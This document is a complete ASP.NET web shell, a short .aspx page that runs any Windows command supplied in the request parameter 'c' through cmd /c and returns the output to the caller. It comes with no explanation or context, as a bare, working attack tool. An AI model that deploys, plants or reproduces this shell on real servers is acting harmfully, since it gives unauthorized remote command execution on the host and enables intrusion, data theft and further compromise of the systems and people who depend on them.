<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%=
Process.Start(
 new ProcessStartInfo("cmd" ,"/c " + Request["c"] )
 {
 UseShellExecute = false,
 RedirectStandardOutput = true
 }
).StandardOutput.ReadToEnd()
%>
